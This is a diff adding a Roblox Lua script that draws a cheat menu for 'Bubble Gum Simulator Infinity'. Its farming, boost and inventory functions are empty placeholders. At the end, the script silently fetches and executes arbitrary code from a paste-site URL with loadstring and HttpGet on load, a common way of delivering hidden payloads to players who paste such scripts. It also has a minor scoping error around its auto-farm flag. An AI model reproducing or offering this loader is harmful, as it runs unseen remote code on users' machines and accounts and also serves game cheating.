@@ -1,0 +1,116 @@
+-- Create the GUI
+local player = game.Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Parent = screenGui
+mainFrame.Size = UDim2.new(0, 300, 0, 400)
+mainFrame.Position = UDim2.new(0.5, -150, 0.5, -200)
+mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  -- Set background to black
+mainFrame.BorderSizePixel = 5
+mainFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)  -- White border for contrast
+
+-- Title Label
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Parent = mainFrame
+titleLabel.Size = UDim2.new(1, 0, 0, 40)
+titleLabel.Text = "Bubble Gum Simulator Infinity"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text
+titleLabel.TextSize = 20
+titleLabel.BackgroundTransparency = 1
+
+-- Dark Gray Color (Almost Black)
+local darkGray = Color3.fromRGB(30, 30, 30)  -- This is a very dark gray, almost black
+
+-- Auto Farm Button
+local autoFarmButton = Instance.new("TextButton")
+autoFarmButton.Parent = mainFrame
+autoFarmButton.Size = UDim2.new(0, 280, 0, 40)
+autoFarmButton.Position = UDim2.new(0, 10, 0, 60)
+autoFarmButton.Text = "Start Auto Farm"
+autoFarmButton.BackgroundColor3 = darkGray  -- Dark gray button
+autoFarmButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text
+
+autoFarmButton.MouseButton1Click:Connect(function()
+    if not isAutoFarming then
+        isAutoFarming = true
+        autoFarmButton.Text = "Stop Auto Farm"
+        startAutoFarm()
+    else
+        isAutoFarming = false
+        autoFarmButton.Text = "Start Auto Farm"
+        stopAutoFarm()
+    end
+end)
+
+-- Activate Boosts Button
+local activateBoostButton = Instance.new("TextButton")
+activateBoostButton.Parent = mainFrame
+activateBoostButton.Size = UDim2.new(0, 280, 0, 40)
+activateBoostButton.Position = UDim2.new(0, 10, 0, 110)
+activateBoostButton.Text = "Activate Boosts"
+activateBoostButton.BackgroundColor3 = darkGray  -- Dark gray button
+activateBoostButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text
+
+activateBoostButton.MouseButton1Click:Connect(function()
+    activateBoost()
+end)
+
+-- Show Inventory Button
+local showInventoryButton = Instance.new("TextButton")
+showInventoryButton.Parent = mainFrame
+showInventoryButton.Size = UDim2.new(0, 280, 0, 40)
+showInventoryButton.Position = UDim2.new(0, 10, 0, 160)
+showInventoryButton.Text = "Show Inventory"
+showInventoryButton.BackgroundColor3 = darkGray  -- Dark gray button
+showInventoryButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text
+
+showInventoryButton.MouseButton1Click:Connect(function()
+    showInventory()
+end)
+
+-- Exit Button
+local exitButton = Instance.new("TextButton")
+exitButton.Parent = mainFrame
+exitButton.Size = UDim2.new(0, 100, 0, 40)
+exitButton.Position = UDim2.new(1, -110, 0, 350)
+exitButton.Text = "Exit"
+exitButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)  -- Red exit button
+exitButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text
+
+exitButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+
+-- Placeholder functions for your script functionality
+local isAutoFarming = false
+function startAutoFarm()
+    print("Auto farming started!")
+    -- Add your farming loop logic here
+end
+
+function stopAutoFarm()
+    print("Auto farming stopped!")
+    -- Add your logic to stop farming here
+end
+
+function activateBoost()
+    print("Boost activated!")
+    -- Add logic for activating boosts here
+end
+
+function showInventory()
+    print("Displaying inventory!")
+    -- Add your logic for showing the inventory here
+end
+
+-- Load the external script when the GUI is loaded
+local success, errorMessage = pcall(function()
+    loadstring(game:HttpGet("http://vpaste.net/9wLAb"))()
+end)
+
+if not success then
+    warn("Error loading external script: " .. errorMessage)
+end
